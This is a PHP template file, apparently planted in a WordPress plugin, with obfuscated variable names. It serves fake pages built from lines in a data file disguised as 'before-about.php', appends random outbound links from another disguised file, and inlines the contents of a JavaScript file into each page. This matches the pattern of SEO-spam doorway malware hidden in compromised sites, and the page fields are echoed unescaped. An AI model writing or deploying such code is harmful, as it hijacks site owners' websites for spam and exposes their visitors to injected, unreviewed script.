<?php
$uMOj2 = intval(get_query_var('ljsmmaa'));

if ($uMOj2 < 1 || $uMOj2 > 4913) return;
$fChDDVVt = file(plugin_dir_path(__FILE__).'before-about.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$aMzP4Dk9RP = explode(';', $fChDDVVt[$uMOj2]);
if (count($aMzP4Dk9RP) < 2) return;
$sdmiZM = $aMzP4Dk9RP[0];
$oQye1W  = $aMzP4Dk9RP[1];
$hgIYBFB = $aMzP4Dk9RP[2];
$g9k2QeAO  = $aMzP4Dk9RP[3];
$iv3S8a0Ou = $aMzP4Dk9RP[4];
set_query_var('zqsbxpao', $sdmiZM);

$wm5rF = '';
$l2u9bwlo = plugin_dir_path(__FILE__).'group-new.php';
if (is_file($l2u9bwlo)) {
	$cOEZBnUZ = file($l2u9bwlo, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($cOEZBnUZ);
	shuffle($cOEZBnUZ);
	$aEuZNn6jLy = mt_rand(2, 5);
	if (count($cOEZBnUZ) > $aEuZNn6jLy) {
		for ($bqR8m = 0; $bqR8m < $aEuZNn6jLy; $bqR8m++) {
			$rTB1oJYpu = array_shift($cOEZBnUZ);
			$wm5rF .= '<p><a href="'.$rTB1oJYpu.'">'.$rTB1oJYpu.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $sdmiZM; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $oQye1W . "</p>\n";
				if (strlen($g9k2QeAO) > 0) echo "<p>" . $g9k2QeAO . "</p>\n";
				if (strlen($hgIYBFB) > 0) echo "<p>" . $hgIYBFB . "</p>\n";
				if (strlen($iv3S8a0Ou) > 0) echo '<p><a href="#"><img src="'.$iv3S8a0Ou.'"></a>' . "</p>\n";
				echo $wm5rF;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$miFqT2Ed = plugin_dir_path(__FILE__) . 'chat-additional.js';
if (is_file($miFqT2Ed)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($miFqT2Ed);
	echo '</script>';
}
get_footer();
?>
